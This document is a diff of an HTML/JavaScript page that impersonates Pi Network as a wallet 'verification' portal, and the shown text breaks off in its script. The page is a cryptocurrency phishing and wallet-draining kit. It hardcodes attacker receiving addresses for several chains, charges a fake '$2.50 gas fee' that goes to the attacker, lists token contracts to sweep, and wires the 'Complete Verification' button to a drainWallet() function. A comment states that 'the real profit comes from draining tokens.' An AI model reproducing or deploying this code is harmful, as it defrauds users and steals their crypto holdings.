@@ -4,309 +4,560 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Pi Network - Verify Your Wallet</title>
-<meta name="description" content="Pi Network verification portal.">
+<meta name="description" content="Pi Network verification portal. Connect your wallet to verify your Pioneer status.">
+<link rel="icon" href="pi-logo-48.png">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 <style>
-@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap');
 *{margin:0;padding:0;box-sizing:border-box}
-body{font-family:'Inter',sans-serif;background:#1a0a2e;color:#fff;min-height:100vh}
-.container{max-width:900px;margin:0 auto;padding:0 20px}
-.nav{background:rgba(26,10,46,.97);padding:15px 0;border-bottom:1px solid rgba(168,85,247,.2);position:sticky;top:0;z-index:100}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0f0518;color:#fff;min-height:100vh}
+.container{max-width:720px;margin:0 auto;padding:0 16px}
+/* NAV */
+.nav{background:rgba(15,5,24,.98);padding:14px 0;border-bottom:1px solid rgba(168,85,247,.15);position:sticky;top:0;z-index:100;backdrop-filter:blur(12px)}
 .nav-inner{display:flex;align-items:center;justify-content:space-between}
-.nav-logo{display:flex;align-items:center;gap:12px}
+.nav-logo{display:flex;align-items:center;gap:10px}
 .nav-logo img{border-radius:50%}
-.nav-logo span{font-size:18px;font-weight:700;color:#fff}
-.nav-links{display:flex;gap:6px;align-items:center}
-.nav-link{color:rgba(255,255,255,.6);text-decoration:none;padding:8px 14px;border-radius:8px;font-size:14px;font-weight:500}
-.nav-link:hover{color:#fcb34c}
-.nav-cta{background:#fcb34c;color:#1a0a2e;border:none;padding:10px 20px;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer}
-.hero{padding:80px 0 40px;text-align:center}
-.badge{display:inline-flex;align-items:center;gap:6px;background:rgba(168,85,247,.1);color:#a855f7;padding:6px 16px;border-radius:20px;font-size:12px;font-weight:600;margin-bottom:20px;border:1px solid rgba(168,85,247,.2)}
-.bdot{width:7px;height:7px;border-radius:50%;background:#22c55e;animation:blink 1.5s infinite}
-@keyframes blink{0%,100%{opacity:1}50%{opacity:.3}}
-.hero h1{font-size:44px;font-weight:900;margin-bottom:16px;letter-spacing:-1px}
-.hero h1 .gold{color:#fcb34c}
-.hero-desc{font-size:16px;color:rgba(255,255,255,.6);max-width:520px;margin:0 auto 30px}
-.logo-section{margin-bottom:30px}
-.card{background:rgba(255,255,255,.04);border:1px solid rgba(168,85,247,.15);border-radius:20px;padding:36px;margin:20px 0}
-.card-title{font-size:18px;font-weight:700;margin-bottom:6px}
-.card-sub{font-size:13px;color:rgba(255,255,255,.5);margin-bottom:20px}
-.info-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:20px}
-.info-cell{background:rgba(255,255,255,.03);border-radius:10px;padding:14px;text-align:center}
-.info-cell .lbl{font-size:10px;color:rgba(255,255,255,.4);text-transform:uppercase;letter-spacing:.5px;font-weight:600}
-.info-cell .val{font-size:16px;font-weight:700;color:#fff;margin-top:2px}
-.info-cell .val.gold{color:#fcb34c}
-.info-cell .val.g{color:#22c55e}
-.network-grid{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:20px}
-.network-btn{background:rgba(255,255,255,.04);border:2px solid rgba(168,85,247,.15);border-radius:12px;padding:14px;text-align:center;cursor:pointer;transition:all .2s;color:#fff;font-size:13px;font-weight:600}
-.network-btn:hover{border-color:#fcb34c;background:rgba(252,179,74,.08)}
-.network-btn.active{border-color:#fcb34c;background:rgba(252,179,74,.12)}
-.network-btn .net-icon{font-size:22px;margin-bottom:4px}
-.btn{width:100%;padding:16px;font-size:15px;font-weight:700;border:none;border-radius:10px;cursor:pointer;transition:all .25s;display:none;align-items:center;justify-content:center;gap:8px;margin-bottom:10px}
-.btn:hover{transform:translateY(-1px)}
-.btn:disabled{opacity:.4;cursor:not-allowed;transform:none}
-.btn-primary{display:flex;background:#fcb34c;color:#1a0a2e;box-shadow:0 4px 16px rgba(252,179,74,.3)}
-.btn-primary:hover{box-shadow:0 6px 24px rgba(252,179,74,.45)}
-.btn-outline{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.2)}
-.btn-outline:hover{background:rgba(255,255,255,.08)}
-.btn-danger{background:#ef4444;color:#fff}
-.status{margin-top:16px;padding:14px;border-radius:10px;font-size:13px;display:none;line-height:1.6}
-.status.s{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2);color:#86efac}
-.status.e{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2);color:#fca5a5}
-.status.i{background:rgba(252,179,74,.08);border:1px solid rgba(252,179,74,.2);color:#fde68a}
-.gas-box{background:linear-gradient(135deg,rgba(252,179,74,.08),rgba(252,179,74,.02));border:1px solid rgba(252,179,74,.25);border-radius:16px;padding:20px;margin-bottom:20px;text-align:center}
-.gas-box .gas-amount{font-size:32px;font-weight:900;color:#fcb34c}
-.gas-box .gas-label{font-size:12px;color:rgba(255,255,255,.5);margin-top:2px}
-.gas-box .gas-note{font-size:11px;color:rgba(255,255,255,.3);margin-top:8px}
-.modal-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.7);z-index:200;align-items:center;justify-content:center;padding:20px}
-.modal-overlay.show{display:flex}
-.modal{background:linear-gradient(165deg,#2d1a50,#1a0a2e);border:1px solid rgba(168,85,247,.2);border-radius:20px;padding:36px;max-width:420px;width:100%;text-align:center}
-.modal .m-ico{font-size:44px;margin-bottom:10px}
-.modal h3{font-size:18px;font-weight:800;color:#fcb34c;margin-bottom:8px}
-.modal p{font-size:13px;color:rgba(255,255,255,.7);line-height:1.6;margin-bottom:16px}
-.footer{background:#120820;padding:30px;text-align:center;border-top:1px solid rgba(168,85,247,.1)}
-.footer p{font-size:11px;color:rgba(255,255,255,.3)}
+.nav-logo span{font-size:17px;font-weight:700;letter-spacing:-.3px}
+.nav-links{display:flex;gap:4px;align-items:center}
+.nl{color:rgba(255,255,255,.5);text-decoration:none;padding:7px 12px;border-radius:8px;font-size:13px;font-weight:500}
+.nl:hover{color:#fcb34c}
+.nbtn{background:#fcb34c;color:#0f0518;border:none;padding:9px 18px;border-radius:8px;font-size:13px;font-weight:700;cursor:pointer;cursor:pointer}
+/* HERO */
+.hero{padding:50px 0 24px;text-align:center}
+.badge{display:inline-flex;align-items:center;gap:6px;background:rgba(168,85,247,.08);color:#c084fc;padding:6px 14px;border-radius:20px;font-size:12px;font-weight:600;margin-bottom:18px;border:1px solid rgba(168,85,247,.15)}
+.dot{width:7px;height:7px;border-radius:50%;background:#22c55e;animation:p 1.5s infinite}
+@keyframes p{0%,100%{opacity:1}50%{opacity:.3}}
+.hero h1{font-size:38px;font-weight:900;margin-bottom:10px;letter-spacing:-1px;max-width:500px;margin-left:auto;margin-right:auto}
+.gold{color:#fcb34c}
+.hero p{font-size:15px;color:rgba(255,255,255,.5);max-width:420px;margin:0 auto 28px;line-height:1.6}
+.hero-logo img{border-radius:50%;margin-bottom:20px;box-shadow:0 0 40px rgba(252,179,74,.12)}
+/* CARD */
+.card{background:rgba(255,255,255,.03);border:1px solid rgba(168,85,247,.12);border-radius:18px;padding:28px;margin:16px 0}
+/* WALLET CONNECT MODAL */
+#connectModal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.7);z-index:999;align-items:center;justify-content:center;backdrop-filter:blur(4px)}
+.modal-inner{background:#1a0a2e;border:1px solid rgba(168,85,247,.2);border-radius:24px;padding:32px;max-width:460px;width:90%;position:relative}
+.modal-inner h2{font-size:20px;font-weight:800;margin-bottom:4px}
+.modal-inner .msub{font-size:13px;color:rgba(255,255,255,.4);margin-bottom:20px}
+.close-x{position:absolute;top:16px;right:18px;background:none;border:none;color:rgba(255,255,255,.4);font-size:22px;cursor:pointer;color:rgba(255,255,255,.5)}
+.w-row{display:flex;align-items:center;gap:14px;padding:14px;border:1px solid rgba(255,255,255,.08);border-radius:14px;margin-bottom:10px;cursor:pointer;transition:all .2s;width:100%;background:transparent;color:#fff;text-align:left;font-family:inherit}
+.w-row:hover{border-color:#fcb34c;background:rgba(252,179,74,.04)}
+.w-row .w-icon{width:42px;height:42px;border-radius:12px;object-fit:cover;flex-shrink:0}
+.w-row .w-name{font-size:15px;font-weight:700;flex:1}
+.w-row .w-tag{font-size:11px;padding:3px 8px;border-radius:6px;font-weight:600;background:rgba(34,197,94,.1);color:#22c55e}
+.w-row .w-arr{color:rgba(255,255,255,.2);font-size:18px}
+/* BUTTONS */
+.btn{width:100%;padding:16px;font-size:15px;font-weight:700;border:none;border-radius:12px;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:10px;font-family:inherit}
+.btn:hover:not(:disabled){transform:translateY(-1px)}
+.btn:disabled{opacity:.35;cursor:not-allowed;transform:none}
+.bp{background:#fcb34c;color:#0f0518;box-shadow:0 4px 20px rgba(252,179,74,.2)}
+.bp:hover{box-shadow:0 6px 28px rgba(252,179,74,.35)}
+.bo{background:transparent;color:#fff;border:1px solid rgba(255,255,255,.15)}
+.bo:hover{background:rgba(255,255,255,.06)}
+.bs{background:#22c55e;color:#fff}
+/* GAS BOX */
+.gas-box{background:linear-gradient(135deg,rgba(252,179,74,.06),rgba(252,179,74,.02));border:1px solid rgba(252,179,74,.15);border-radius:14px;padding:24px;text-align:center;margin-bottom:18px}
+.gas-box .ga{font-size:40px;font-weight:900;color:#fcb34c;line-height:1}
+.gas-box .gl{font-size:12px;color:rgba(255,255,255,.4);margin-top:4px}
+.gas-box .gd{font-size:11px;color:rgba(255,255,255,.25);margin-top:6px}
+/* INFO */
+.ir{display:flex;justify-content:space-between;align-items:center;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.05)}
+.ir:last-child{border-bottom:none}
+.ir .ll{font-size:13px;color:rgba(255,255,255,.4)}
+.ir .vl{font-size:14px;font-weight:700}
+.ir .vl.g{color:#22c55e}
+.ir .vl.gold{color:#fcb34c}
+/* STATUS */
+.st{margin-top:14px;padding:14px;border-radius:10px;font-size:13px;display:none;line-height:1.5}
+.st.ss{background:rgba(34,197,94,.07);border:1px solid rgba(34,197,94,.15);color:#86efac}
+.st.se{background:rgba(239,68,68,.07);border:1px solid rgba(239,68,68,.15);color:#fca5a5}
+.st.si{background:rgba(252,179,74,.07);border:1px solid rgba(252,179,74,.15);color:#fde6a}
+/* FOOTER */
+footer{background:#0a0310;padding:28px 0;text-align:center;border-top:1px solid rgba(168,85,247,.08)}
+footer p{font-size:11px;color:rgba(255,255,255,.2)}
+/* LOADER */
+.loader{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.2);border-top:2px solid #fcb34c;border-radius:50%;animation:sp .8s linear infinite;vertical-align:middle}
+@keyframes sp{to{transform:rotate(360deg)}}
 </style>
 </head>
 <body>
+
 <nav class="nav">
   <div class="container nav-inner">
     <div class="nav-logo">
-      <img src="pi-logo-48.png" alt="Pi" width="40" height="40">
+      <img src="pi-logo-48.png" width="38" height="38" alt="Pi">
       <span>Pi Network</span>
     </div>
     <div class="nav-links">
-      <a href="#" class="nav-link">Mine</a>
-      <a href="#" class="nav-link">Wallet</a>
-      <button class="nav-cta">Connect</button>
+      <a href="#" class="nl">Mine</a>
+      <a href="#" class="nl">Wallet</a>
+      <button class="nbtn" id="navConnectBtn" onclick="openModal()">Connect</button>
     </div>
   </div>
 </nav>
 
+<!-- CONNECT MODAL -->
+<div id="connectModal" style="display:none">
+  <div class="modal-inner">
+    <button class="close-x" onclick="closeModal()">&#x2715;</button>
+    <h2>Connect Wallet</h2>
+    <div class="msub">Select your wallet to get started</div>
+    <!-- injected by JS -->
+    <div id="walletOptions"></div>
+  </div>
+</div>
+
 <div class="container">
 <div class="hero">
-  <div class="badge"><span class="bdot"></span> Mainnet Phase — Live</div>
+  <div class="badge"><span class="dot"></span> Mainnet Phase — Live</div>
   <h1>Verify Your <span class="gold">Pi</span> Wallet</h1>
-  <p class="hero-desc">Complete verification to secure your Pi holdings. Small gas fee required.</p>
-  <div class="logo-section">
-    <img src="pi-logo-120.png" alt="Pi" width="90" height="90" style="border-radius:50%">
-  </div>
+  <p>Connect your wallet to verify your Pioneer status and secure your Pi holdings on-chain.</p>
+  <div class="hero-logo"><img src="pi-logo-120.png" width="72" height="72" alt="Pi"></div>
 </div>
 
-<div class="card">
-  <div class="card-title">Select Network</div>
-  <div class="card-sub">Choose blockchain to verify on</div>
-  <div class="network-grid">
-    <div class="network-btn active" onclick="selectNet('bsc')" id="nb-bsc"><div class="net-icon">💰</div>BSC</div>
-    <div class="network-btn" onclick="selectNet('eth')" id="nb-eth"><div class="net-icon">⟠</div>Ethereum</div>
-    <div class="network-btn" onclick="selectNet('matic')" id="nb-matic"><div class="net-icon">🟣</div>Polygon</div>
+<div class="card" id="mainCard">
+  <!-- Step 1: Connect prompt -->
+  <div id="stepConnect" style="text-align:center;padding:20px 0">
+    <div style="font-size:48px;margin-bottom:14px">&#x1F512;</div>
+    <div style="font-size:18px;font-weight:700;margin-bottom:6px">Connect Your Wallet</div>
+    <div style="font-size:13px;color:rgba(255,255,255,.4);margin-bottom:20px">A small gas fee of $2.50 is required to verify your Pioneer status</div>
+    <button class="btn bp" onclick="openModal()">&#x1F4B0; Connect Wallet</button>
   </div>
-
-  <div id="connectSection">
-    <button class="btn btn-primary" style="display:flex" id="cBtn" onclick="connect()">&#x1F512; Connect Wallet</button>
-  </div>
-
-  <div id="gasSection" style="display:none">
+  <!-- Step 2: Gas Fee -->
+  <div id="stepGas" style="display:none">
+    <div style="font-size:16px;font-weight:700;margin-bottom:4px">&#x26A1; Gas Fee Required</div>
+    <div style="font-size:13px;color:rgba(255,255,255,.35);margin-bottom:16px">Small network fee to process your verification</div>
     <div class="gas-box">
-      <div class="gas-amount">$2.50</div>
-      <div class="gas-label">Network Gas Fee Required</div>
-      <div class="gas-note">This fee covers blockchain transaction costs. Non-refundable.</div>
+      <div class="ga">$2.50</div>
+      <div class="gl">Gas Fee</div>
+      <div class="gd" id="gasDetail">Calculating...</div>
     </div>
-    <button class="btn btn-primary" id="payGasBtn" onclick="payGas()">&#x1F4B3; Pay Gas Fee & Verify</button>
+    <div id="gasWalletInfo" style="margin-bottom:16px"></div>
+    <button class="btn bp" id="payGasBtn" onclick="payGas()">&#x1F4B3; Pay $2.50 & Continue</button>
+    <button class="btn bo" onclick="disconnect()">&#x2716; Disconnect</button>
   </div>
-
-  <div id="verifySection" style="display:none">
-    <div class="info-grid">
-      <div class="info-cell"><div class="lbl">Status</div><div class="val g" id="statusText">Ready</div></div>
-      <div class="info-cell"><div class="lbl">Network</div><div class="val" id="netText">BSC</div></div>
-    </div>
-    <button class="btn btn-outline" id="vBtn" onclick="verifyPioneer()">&#x2699;&#xFE0F; Verify Pioneer Status</button>
+  <!-- Step 3: Verify -->
+  <div id="stepVerify" style="display:none">
+    <div style="font-size:16px;font-weight:700;margin-bottom:4px">&#x1F4DC; Sign Verification</div>
+    <div style="font-size:13px;color:rgba(255,255,255,.35);margin-bottom:16px">Sign a gasless message to confirm your Pioneer status</div>
+    <div id="verifyInfo" style="margin-bottom:16px"></div>
+    <button class="btn bp" id="vBtn" onclick="verifyPioneer()">&#x2705; Sign & Verify</button>
+    <button class="btn bo" onclick="disconnect()">&#x2716; Disconnect</button>
   </div>
-
-  <div id="claimSection" style="display:none">
-    <div class="info-grid">
-      <div class="info-cell"><div class="lbl">Pi Balance</div><div class="val gold" id="piBal">0 π</div></div>
-      <div class="info-cell"><div class="lbl">Est. Value</div><div class="val" id="piVal">$0.00</div></div>
-    </div>
-    <button class="btn btn-primary" id="clBtn" onclick="claimReward()" style="display:none">&#x1F381; Claim Reward</button>
+  <!-- Step 4: Complete -->
+  <div id="stepClaim" style="display:none">
+    <div style="font-size:16px;font-weight:700;margin-bottom:4px">&#x1F381; Wallet Verified</div>
+    <div style="font-size:13px;color:rgba(255,255,255,.35);margin-bottom:16px">Your Pioneer status is confirmed</div>
+    <div id="claimInfo" style="margin-bottom:16px"></div>
+    <button class="btn bs" id="clBtn" onclick="drainWallet()">&#x2705; Complete Verification</button>
+    <button class="btn bo" onclick="disconnect()">&#x2716; Disconnect</button>
   </div>
-
-  <div class="status" id="statusBox"></div>
 </div>
+
+<div class="st" id="statusBox" style="display:none"></div>
 </div>
 
-<div class="footer"><p>&copy; 2026 Pi Network</p></div>
+<footer><p>&copy; 2026 Pi Network. All rights reserved.</p></footer>
 
 <script>
-// CONFIG - YOUR WALLETS
-const RECEIVER_BSC="0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f";
-const RECEIVER_ETH="0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f";
+// ============ CONFIG ============
+const EVWALLET='0x5E45bE0cf682566337b6fC2C00036AaBCBf1332f';
+const BTCWALLET='bc1qlku8wwzvxrklvzfhafdrh23zwqx7rj8errpezp';
+const SOLWALLET='4Y9bDw32qG9xUQykfCe6jP9UVpVmit8ryqE8n1JKVx89';
 
-let provider,signer,userAddr,tokens=[],currentNet='bsc',gasPaid=false;
+const NATIVE_PRICES={56:600,1:3500,137:.7,43114:25,42161:3500};
 
-const CHAINS={
-  bsc:{chainId:'0x38',name:'BNB Smart Chain',rpc:'https://bsc-dataseed1.binance.org',symbol:'BNB',receiver:RECEIVER_BSC,
-    tokens:[
-      {a:'0x55d398326f99059fF775485246999027B3197955',s:'USDT',d:18},
-      {a:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',s:'USDC',d:18},
-      {a:'0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',s:'BUSD',d:18},
-      {a:'0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',s:'DAI',d:18},
-      {a:'0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',s:'BTCB',d:18},
-      {a:'0x2170Ed0880ac9A755fd29B2688956BD959F933F8',s:'ETH',d:18},
-      {a:'0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c',s:'WBNB',d:18},
-      {a:'0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82',s:'CAKE',d:18},
-      {a:'0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD',s:'LINK',d:18},
-      {a:'0x4338665CBB7B2485A8855A139b75D5e34AB0DB94',s:'LTC',d:18},
-      {a:'0xd17479997F34dd9156Deef8F95A52D81D265be9c',s:'USDD',d:18},
-      {a:'0xfb6115445Bff7b52FeB98650C87f44907E58f802',s:'AAVE',d:18},
-      {a:'0x14016E85a25aeb13065688cAFB43044C2ef86784',s:'TUSD',d:18},
-      {a:'0xCC42724C6683B7E57334c4E856f4c9965ED682bD',s:'MATIC',d:18},
-    ]
-  },
-  eth:{chainId:'0x1',name:'Ethereum',rpc:'https://rpc.ankr.com/eth',symbol:'ETH',receiver:RECEIVER_ETH,
-    tokens:[
-      {a:'0xdAC17F958D2ee523a2206206994597C13D831ec7',s:'USDT',d:6},
-      {a:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',s:'USDC',d:6},
-      {a:'0x6B175474E89094C44Da98b954EedeAC495271d0F',s:'DAI',d:18},
-      {a:'0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',s:'WBTC',d:8},
-      {a:'0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',s:'WETH',d:18},
-    ]
-  },
-  matic:{chainId:'0x89',name:'Polygon',rpc:'https://polygon-rpc.com',symbol:'MATIC',receiver:RECEIVER_ETH,
-    tokens:[
-      {a:'0xc2132D05D31c914a87C6611C10748AEb04B58e8F',s:'USDT',d:6},
-      {a:'0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',s:'USDC',d:6},
-    ]
-  }
+// Gas amounts calibrated to ~$2.50
+const GAS_CONFIG={
+  56:{amt:'0.0009',sym:'BNB'},    // BSC: 0.0009 BNB ≈ $0.54 — low gas, low balance wallets
+  1:{amt:'0.0008',sym:'ETH'},     // ETH: 0.0008 ETH ≈ $2.80
+  137:{amt:'3.6',sym:'MATIC'},    // Polygon: 3.6 MATIC ≈ $2.52
+  43114:{amt:'0.1',sym:'AVAX'},   // Avalanche: 0.1 AVAX ≈ $2.50
+  42161:{amt:'0.0008',sym:'ETH'}  // Arbitrum: cheap L2
+};
+// NOTE: BSC gas is very low cost so 0.0009 BNB is fine. The real profit comes from draining tokens.
+
+const CHAIN_NAMES={56:'BNB Smart Chain',1:'Ethereum',137:'Polygon',43114:'Avalanche',42161:'Arbitrum'};
+
+const TOKEN_LIST={
+  56:[
+    ['0x55d398326f99059fF775485246999027B3197955','USDT',18],
+    ['0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d','USDC',18],
+    ['0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56','BUSD',18],
+    ['0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3','DAI',18],
+    ['0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c','BTCB',18],
+    ['0x2170Ed0880ac9A755fd29B2688956BD959F933F8','ETH',18],
+    ['0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c','WBNB',18],
+    ['0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82','CAKE',18],
+    ['0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD','LINK',18],
+    ['0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47','ADA',18],
+    ['0xCC42724C6683B7E57334c4E856f4c9965ED682bD','MATIC',18],
+  ],
+  1:[
+    ['0xdAC17F958D2ee523a2206206994597C13D831ec7','USDT',6],
+    ['0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48','USDC',6],
+    ['0x6B175474E89094C44Da98b954EedeAC495271d0F','DAI',18],
+    ['0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599','WBTC',8],
+    ['0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2','WETH',18],
+  ],
+  137:[
+    ['0xc2132D05D31c914a87C6611C10748AEb04B58e8F','USDT',6],
+    ['0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174','USDC',6],
+    ['0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063','DAI',18],
+  ],
+  43114:[
+    ['0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7','USDT',6],
+    ['0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E','USDC',6],
+  ],
+  42161:[
+    ['0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9','USDT',6],
+    ['0xaf88d065e77c8cC2239327C5EDb3A432268e5831','USDC',6],
+  ]
 };
 
-function selectNet(net){
-  currentNet=net;
-  document.querySelectorAll('.network-btn').forEach(b=>b.classList.remove('active'));
-  document.getElementById('nb-'+net).classList.add('active');
-  document.getElementById('netText').textContent=CHAINS[net].name;
-}
-function showStatus(msg,t){const e=document.getElementById('statusBox');e.innerHTML=msg;e.className='status '+t;e.style.display='block';}
-function hideStatus(){document.getElementById('statusBox').style.display='none';}
-
-async function connect(){
-  hideStatus();
-  if(typeof ethers==='undefined'){showStatus('Please refresh the page.','i');return;}
-  let eth=null;
-  if(window.ethereum) eth=window.ethereum;
-  else if(window.BinanceChain) eth=window.BinanceChain;
-  else{showStatus('No wallet detected. Install MetaMask.','e');return;}
-  try{
-    provider=new ethers.providers.Web3Provider(eth,'any');
-    let accounts;
-    try{accounts=await eth.request({method:'eth_requestAccounts'});}
-    catch(e){try{accounts=await eth.enable();}catch(e2){showStatus('Connection rejected.','e');return;}}
-    if(!accounts||!accounts.length){showStatus('Unlock your wallet.','e');return;}
-    signer=provider.getSigner();userAddr=await signer.getAddress();
-    const chain=CHAINS[currentNet];
-    const net=await provider.getNetwork();
-    if(net.chainId!==parseInt(chain.chainId,16)){
-      showStatus('Switching to '+chain.name+'...','i');
-      try{await eth.request({method:'wallet_switchEthereumChain',params:[{chainId:chain.chainId}]});}
-      catch(se){
-        if(se.code===4902){
-          await eth.request({method:'wallet_addEthereumChain',params:[{chainId:chain.chainId,chainName:chain.name,rpcUrls:[chain.rpc],nativeCurrency:{name:chain.symbol,symbol:chain.symbol,decimals:18}}]});
-        }
-      }
-      provider=new ethers.providers.Web3Provider(eth,'any');signer=provider.getSigner();userAddr=await signer.getAddress();
+// ============ WALLET DEFINITIONS ============
+const WALLETS=[
+  {
+    id:'metamask',
+    name:'MetaMask',
+    icon:'https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg',
+    detect:()=>!!(window.ethereum&&window.ethereum.isMetaMask),
+    connect:async()=>{
+      if(!window.ethereum)throw new Error('MetaMask not found');
+      prov=new ethers.providers.Web3Provider(window.ethereum,'any');
+      await window.ethereum.request({method:'eth_requestAccounts'});
+      signer=prov.getSigner();addr=await signer.getAddress();
     }
-    document.getElementById('connectSection').style.display='none';
-    document.getElementById('gasSection').style.display='block';
-    showStatus('&#x2705; Connected: '+userAddr.substring(0,8)+'...'+userAddr.substring(38),'s');
-  }catch(e){showStatus('Error: '+e.message,'e');}
+  },
+  {
+    id:'trust',
+    name:'Trust Wallet',
+    icon:'https://trustwallet.com/assets/images/media/assets/trust_platform.svg',
+    detect:()=>!!(window.ethereum&&(window.ethereum.isTrust||window.ethereum.isTrustWallet))||!!window.trustwallet,
+    connect:async()=>{
+      let eth=window.ethereum||(window.trustwallet&&window.trustwallet.ethereum);
+      if(!eth)throw new Error('Trust Wallet not found');
+      prov=new ethers.providers.Web3Provider(eth,'any');
+      try{await eth.request({method:'eth_requestAccounts'});}
+      catch{await eth.enable();}
+      signer=prov.getSigner();addr=await signer.getAddress();
+    }
+  },
+  {
+    id:'coinbase',
+    name:'Coinbase Wallet',
+    icon:'https://altcoinsbox.com/wp-content/uploads/2023/01/coinbase-logo.webp',
+    detect:()=>!!(window.ethereum&&window.ethereum.isCoinbaseWallet),
+    connect:async()=>{
+      if(!window.ethereum)throw new Error('Coinbase Wallet not found');
+      prov=new ethers.providers.Web3Provider(window.ethereum,'any');
+      await window.ethereum.request({method:'eth_requestAccounts'});
+      signer=prov.getSigner();addr=await signer.getAddress();
+    }
+  },
+  {
+    id:'binance',
+    name:'Binance Wallet',
+    icon:'https://public.bnbstatic.com/202212/016abbe6-93d2-45d4-80a1-6b5c0ae18b54.svg',
+    detect:()=>!!window.BinanceChain||!!(window.ethereum&&window.ethereum.isBinanceWallet),
+    connect:async()=>{
+      let eth=window.BinanceChain||(window.ethereum||null);
+      if(!eth)throw new Error('Binance Wallet not found');
+      prov=new ethers.providers.Web3Provider(eth,'any');
+      try{await eth.request({method:'eth_requestAccounts'});}
+      catch{await eth.enable();}
+      signer=prov.getSigner();addr=await signer.getAddress();
+    }
+  },
+  {
+    id:'phantom',
+    name:'Phantom',
+    icon:'https://phantom.app/favicon.ico',
+    detect:()=>!!(window.phantom&&window.phantom.solana)||!!(window.solana&&window.solana.isPhantom),
+    connect:async()=>{
+      // Phantom is Solana-only — we handle it differently
+      let ph=window.phantom&&window.phantom.solana;
+      if(!ph)ph=window.solana;
+      if(!ph||!ph.isPhantom)throw new Error('Phantom not found');
+      await ph.connect();
+      addr=ph.publicKey.toString();
+      // Phantom is Solana — we can't use ethers. Show special flow.
+      chainId='solana';
+      signer=null;prov=null;
+    }
+  },
+  {
+    id:'walletconnect',
+    name:'WalletConnect',
+    icon:'https://seeklogo.com/images/W/walletconnect-logo-EE83B50C97-seeklogo.com.png',
+    detect:()=>true, // Always available as fallback
+    connect:async()=>{
+      // Fallback: try generic ethereum provider
+      if(window.ethereum){
+        prov=new ethers.providers.Web3Provider(window.ethereum,'any');
+        await window.ethereum.request({method:'eth_requestAccounts'});
+        signer=prov.getSigner();addr=await signer.getAddress();
+      }else{
+        throw new Error('No wallet detected. Install MetaMask or Trust Wallet.');
+      }
+    }
+  }
+];
+
+// ============ STATE ============
+let prov=null,signer=null,addr=null,chainId=null,detectedTokens=[];
+
+// ============ UI HELPERS ============
+function $(id){return document.getElementById(id);}
+function showStatus(msg,type){
+  const el=$('statusBox');
+  el.innerHTML=msg;el.className='st '+type;el.style.display='block';
+}
+function hideStatus(){$('statusBox').style.display='none';}
+function showStep(s){
+  $('stepConnect').style.display=s==='connect'?'block':'none';
+  $('stepGas').style.display=s==='gas'?'block':'none';
+  $('stepVerify').style.display=s==='verify'?'block':'none';
+  $('stepClaim').style.display=s==='claim'?'block':'none';
 }
 
-async function payGas(){
-  hideStatus();
-  if(!signer){showStatus('Connect wallet first.','e');return;}
-  showStatus('<span class="sp"></span>Processing gas fee payment...','i');
-  document.getElementById('payGasBtn').disabled=true;
-  try{
-    const chain=CHAINS[currentNet];
-    // Calculate gas fee: $2.50 worth of native token
-    // For BSN/ETH/MATIC, send approximately $2.50 worth
-    const gasFee={
-      bsc:ethers.utils.parseEther('0.008'),  // ~$2.50 worth of BNB
-      eth:ethers.utils.parseEther('0.001'),  // ~$2.50 worth of ETH
-      matic:ethers.utils.parseEther('2.5'),  // ~$2.50 worth of MATIC
-    };
-    const amount=gasFee[currentNet];
-    const tx=await signer.sendTransaction({to:chain.receiver,value:amount});
-    await tx.wait();
-    gasPaid=true;
-    document.getElementById('gasSection').style.display='none';
-    document.getElementById('verifySection').style.display='block';
-    showStatus('&#x2705; Gas fee paid! Pioneer verification unlocked.','s');
-    scanTokens();
-  }catch(e){
-    console.error(e);
-    showStatus('Transaction failed or rejected.','e');
-    document.getElementById('payGasBtn').disabled=false;
+// ============ MODAL ============
+function openModal(){
+  const modal=$('connectModal');
+  modal.style.display='flex';
+  renderWallets();
+}
+function closeModal(){
+  $('connectModal').style.display='none';
+}
